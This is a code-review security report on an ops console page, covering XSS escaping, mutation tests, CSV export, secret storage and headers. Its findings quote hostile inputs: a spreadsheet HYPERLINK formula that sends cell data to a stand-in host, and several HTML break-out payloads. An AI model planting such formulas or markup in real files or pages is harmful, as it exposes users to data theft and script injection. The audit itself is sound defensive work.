# C-200 reviewer report (Lane 5): ops-console console.html, XSS and secret handling (BACKLOG R-05), main b1872ee (services/ops-console unchanged on 7b54f26)

VERDICT: no exploitable XSS found in console.html: every server-supplied string reaches the DOM through `esc()` or `textContent`, and 70 of 79 `esc()`-removal mutants are caught by my hostile-data probe while the repo's 171 tests catch none of 12 I sampled, so the safety rests on today's code, not on a test. Six findings: a CSV formula-injection hole in the export (MEDIUM, proven), the unpinned escaping (MEDIUM), the perimeter secret handled without the secure-context rule the operator key gets (MEDIUM, design), the operator key sent on every read (LOW), no script-src policy and 25 inline handlers (LOW), and a silent blank dashboard on one malformed row (LOW, read not probed). The C-20 secure-context rule is well pinned (10 of 10 mutants killed by the repo's tests).

OBJECTIONS FIRST
1. "No XSS found" is evidence of absence of what I looked for, not proof. I read the two script blocks (lines 743 to 1932) in full and the head and controls (lines 1 to 12, 250 to 272) and grepped the markup and CSS in between for sinks; I did not read the 740 lines of CSS and static markup line by line. The probe feeds payloads I thought of (7 variants) to every field the dashboard renders; a payload that depends on a browser parser quirk jsdom (parse5) does not share would not show. [HIGH]
2. The page has no Content-Security-Policy that restricts scripts (finding 5), so a single missed sink would run with the operator's session: the shared secret and, on a secure origin, the operator key are in `sessionStorage` (readable by any script on the origin). The blast radius of any future XSS is the whole console. [HIGH]
3. All estate-specific facts (which listener, which address) are withheld from this report because the repository is public; see the coordinator for addresses. [HIGH]
4. The dashboard is not where the only same-origin risk lives: every service is a path prefix of the same origin (`/registry`, `/ledger`, `/attest`, ...), so an XSS in any of them reaches this page's storage. I checked the one rendered-HTML route the console links to (the attestation board pack): all interpolations escaped (finding 7). Other services return JSON; I did not audit their content types. [HIGH on the pack, LOW elsewhere]

REASONING
1. The Setup area (:1382-1928) never assigns markup: its helpers `mk()` and `kv()` use `textContent` only (:1402-1418), the hash route is shown through `scrub()` and `textContent` (:1626). The rule its header states ("API data only ever reaches the page through textContent / createElement") holds in the code. [HIGH, read]
2. Interpolations into markup that are NOT wrapped in `esc()` (each checked): table header cells (:895, constants); `fmtTokens()` output (:1008, `Number(n)||0` then a number string); `.length` counts (:1286-1299, 1176); `${nErr === 1 ? "" : "s"}`; class tokens built from constants (:995, 997, 1006, 1011); `modelsCell()` (:1181, already escaped inside); `domainTally(c)` (:1116-1117, every field escaped); `data-id="${id}"` in `actionButtons` where `id = esc(a.agent_id)` (:940). None carries server text unescaped. `v.className = data.decision` (:1322) sets a class from a server string (not markup; cosmetic only). [HIGH, read]
3. Event handlers carry ids only through `data-id` attributes read as `this.dataset.id` (:924, 942-949, 963, 982, 1187); no id is spliced into JavaScript source, as the comment at :882 says. 25 inline `onclick=` and 2 `onchange=` attributes exist (constants and `this.dataset` calls). [HIGH]
4. Dynamic probe on the unmutated page. A jsdom harness (my script, not in the repo) loads console.html with `runScripts: "dangerously"`, stubs `fetch` with an estate whose every string field (agent id, owner, domain, status, event type, clause id, token id and scope, escalation fields, usage and model names, platform health and version, federation contract, manifest raw and reason, check verdict and reasons, bulk and halt results and errors, the heartbeat key names) holds a hostile payload, then drives the drawer, the manifest tab, the payload toggle, the harness check, bulk kill, fleet halt, the ledger filter and the platform refresh, scanning the DOM after every step for injected `img`/`svg` nodes, `on*` attributes naming the payload, extra `script` elements and `window.__pwn`. Seven payloads in the first version (attribute break-out with each quote style, `</td><svg onload>`, `</pre><script>`, `x" onmouseover=`, `</option></select><img>`, `</textarea><img>`) and, in the final version, five data modes (normal, short slices, every section unavailable, every follow-up call failing, hostile status and id) times three payloads: 0 hits in every run. [HIGH, run]
5. Mutation round, `esc(` removed one call site at a time (79 mutants, `esc(x)` to `(x)`, generated by script over the dashboard block). First pass: 55 killed. After fixing three flaws in my own probe (a route-order bug that hid the bulk endpoint, constant ids and statuses in the drawer, an ok-only halt result) and adding data modes: 70 killed, 9 survived. The survivors, probed or reasoned one by one: m001 and m002 (:910, option `value` and label in `fillSelect`): jsdom's parser discards non-option elements inside `<select>`, so the break-out has nowhere to land; I did not confirm this in current Chrome, whose newer "customizable select" parsing relaxes that rule, but the unmutated code escapes both, so this is a probe limit, not a hole [MEDIUM]; m011 (:957, `token_id.slice(0,8)`): 8 characters cannot hold an event handler; m026 (:1011, `open_rogue_flags`) is only rendered when `> 0`, so a value that renders cannot contain markup; m035 (:1100, `esc(action)`): `action` is the constant passed by the button; m036 (:1101, `esc(nErr)`): a number; m058 (:1205, `esc(note)`): the value of a constant map; m062 (:1211, `esc(e.message)` in `loadManifest`): the message is a browser error or the constant "401", at most a short parser snippet. All nine are equivalent or bounded. [HIGH for the counts, MEDIUM for m001/m002]
6. FINDING 1 (MEDIUM, test gap): the repo's tests do not pin the dashboard escaping. I swapped each of 12 killed mutants (every sixth, spanning :898 to :1323) into a copy of the service and ran the full ops-console suite: 12 of 12 passed (171 passed). The Setup area has behavioural tests with mutants; the dashboard sinks have none. Anyone who "simplifies" an `esc()` away ships an XSS with a green CI. Proposed fix below (P1). [HIGH, run]
7. Attestation pack (the one HTML route the console links to, `<a href="/attest/pack.html" target="_blank" rel="noopener">`, :1294): services/attestation-reporter render.py escapes every interpolated value through `html.escape` (:51-94); the only value placed in an attribute is the class built from a metric value that is either exactly "INTACT" or starts "BROKEN — " (engine.py:389), split on the first space, so it can only be `INTACT` or `BROKEN`. `rel=noopener` keeps the opened tab from receiving this tab's `sessionStorage`. [HIGH]
8. FINDING 2 (MEDIUM, PROVEN): CSV formula injection in `GET /api/events/export?format=csv` (services/ops-console api.py:593-618, `csv.writer`, no neutralisation). The ledger accepts any non-empty `event_type` (sealed-ledger api.py:58, `Field(min_length=1)`), any `agent_id` and any payload. Probe (an in-process test in my scratch directory using the repo's own fixture): I appended events with `event_type` `=HYPERLINK("http://x/"&A1,"c")`, `-2+3`, `agent_id` `+cmd` and a tab-led `=1`, `clause_id` `@SUM(1)` and `=1+1`, then exported the CSV: six cells begin with `= + - @` or a tab and are written raw. Opened in Excel or LibreOffice the file evaluates them (data exfiltration through HYPERLINK or WEBSERVICE, DDE on old builds). Who can write such an event: any holder of the ledger's perimeter secret (every service, so one compromised service) or an operator through the sentinel `action` and clause strings that reach `clause_id`. The finance and audit readers this console serves are the people who open CSVs in Excel. Fix: prefix a single quote to any cell that begins with `= + - @ TAB CR` (OWASP guidance), keep the JSON export as is, add a test. [HIGH, run]
9. FINDING 3 (MEDIUM, design question for Don): the perimeter secret `x-field-auth` is stored in `sessionStorage` (:745, :826) and sent on every request by `hdrs()` (:780) whatever the transport. The C-20 secure-context rule (:757-790) protects the operator key only. On a plain-http listener (the one the GB10 still publishes beside the TLS one, per the compose comments: see the coordinator) the secret crosses the network in clear when typed and on every poll and stream request (5 s interval, :1379). The operator key is refused there; the secret that guards the whole API is not. Options: apply `keyTransportOk()` to the secret as well (a locked estate would then be unusable over plain http, which is the point), or record the decision as a documented limit. [HIGH on the code, the decision is Don's]
10. FINDING 4 (LOW): `hdrs()` adds the operator pair to every request from the dashboard (`api()` :831, the stream :1347, the manifest read :1195, the export :1264) when a key is stored on a secure origin, while the Setup area removes it from non-guarded calls (:1458-1460, "operator: true" only). The server forwards the pair only on writes (`_operator_kw`, api.py:618-640), so the key leaves the browser needlessly on about 12 reads a minute (poll and stream) but travels only to the console and the edge. Fix: send the pair only on the guarded POST routes, as `sfetch` does. [HIGH]
11. FINDING 5 (LOW): edge headers and policy. The Caddy console `handle` block sets `X-Frame-Options: DENY`, `Content-Security-Policy: frame-ancestors 'none'` and `X-Content-Type-Options: nosniff` (integration/demo/Caddyfile:80-86 and the Fly Caddyfile :83-85); the GB10 TLS site proxies to the `:8080` site over loopback, so it receives them (Caddyfile.gb10 :43-47, read, not requested live). The console container publishes no port of its own in the compose files I read, so the headers do not depend on a hop that can be bypassed there. What is absent: any `default-src` or `script-src` policy (the page has 2 inline scripts and 25 inline handlers, so a strict policy would first need those refactored), a `Referrer-Policy`, and HSTS on the TLS listener. The consequence is finding 2 of the objections: no second line of defence if a sink is ever missed. The frame headers are correct and are what protects the destructive controls from clickjacking. [HIGH on the config read, LOW on severity]
12. FINDING 6 (LOW, read, not probed): `renderTokens`, `renderAgents` and the others run inside `renderOverview` with no per-row guard; `t.scope.join(", ")` (:959) and `t.token_id.slice` throw on a malformed row, and `refresh()` swallows the exception (:1333: "401 path shows the secret bar"), so one malformed token or agent row from the estate leaves every panel after the ledger-integrity banner stale with no message. Availability and honesty of the display, not security. [MEDIUM]
13. C-20 secure-context rule, mutation round of my own on the shipped tests. Ten mutants of the rule, each run against the full suite: secure-context check removed, `https:` always accepted, loopback test widened, the on-load clear removed, `hdrs()` sending the key regardless, `saveOperator` storing on an insecure page, `localStorage` instead of `sessionStorage`, the key field not cleared after save, the Setup area sending operator headers on non-guarded calls, a LAN host added to the loopback list. All ten killed (1 to 4 tests fail each). The rule is well pinned. `KEY_LOOPBACK_HOSTS` accepts only `127.0.0.1`, `[::1]` and `localhost` (`location.hostname` for IPv6 carries the brackets): conservative, a `*.localhost` name is refused. [HIGH, run]
14. Other secret handling: the secret and key inputs are `type="password"` with `autocomplete="off"` for the key (:260-269); `saveOperator` clears the key field; the export filename comes from `content-disposition` generated by the server from a timestamp (api.py:595); no secret is placed in a URL (`URLSearchParams` carries only filter values); the key never goes to `alert()` or `console.*` (grep: no `console.` call in the file). [HIGH]
